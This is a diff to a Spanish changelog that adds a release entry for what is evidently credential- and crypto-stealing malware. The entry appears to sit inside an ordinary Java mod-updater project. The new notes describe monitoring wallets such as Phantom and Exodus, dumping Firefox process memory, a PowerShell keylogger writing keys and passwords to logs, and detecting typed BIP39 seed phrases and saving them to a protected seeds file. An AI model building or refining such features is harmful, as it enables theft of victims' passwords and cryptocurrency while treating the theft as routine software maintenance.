@@ -1,5 +1,12 @@
 # Changelog
 
+## 0.2.30
+
+- Carteras: `LOST` distingue `grace` de `dead`. Una gracia cierra la extensión del navegador aunque el PID del navegador siga vivo y emite un único `wallet closed`; en cambio conserva Electrum/Ledger/Exodus con PID vivo (rebote de foco) y `dead` limpia siempre. Reabrir Phantom en el mismo navegador dentro del cooldown de 600 s restaura la sesión y reactiva el keylogger sin segundo aviso ni volcado.
+- Volcado en Firefox: se elige el proceso `-contentproc` de mayor `WorkingSet` que no supere 1,5 GB, en vez de gastar el intento en el proceso principal; los navegadores vuelcan un solo proceso y los de escritorio mantienen dos. Si el mayor no cabe se prueba el siguiente y se avisa una sola vez con `wallet dump skipped`.
+- Keylogger: `keys.ps1` marca Ctrl y Alt en `ToUnicodeEx`, de modo que AltGr/Ctrl+Alt devuelve el símbolo del layout (`@`, `€`) y Ctrl solo conserva la letra (`Ctrl+C` → `c`). Las teclas muertas se ignoran y componen con la siguiente. `ct`/`al`/`dk` son diagnóstico y no cambian `keys.log`/`passwords.log`.
+- Keylogger: una seed BIP39 tecleada de 12/24 palabras con checksum válido se avisa como `seed escrita`, se guarda en `cache/ops/seeds.log` y no duplica el aviso de contraseña. `seeds.log` queda protegido por la limpieza de caché.
+
 ## 0.2.29
 
 - Corregida la carrera de `UpdateTest.overlappingModAppliesKeepDistinctStagesAndNewestWins` que tumbó CI en Java 25: el helper ganador borra ahora todos los `mod-update-*.jar`/`spc-mod-new-*.jar` de su versión al instalar o cancelar, en Unix y Windows, en vez de dejar el staging del helper antiguo. Cubierto con 15 ejecuciones forzadas del test en Java 25.
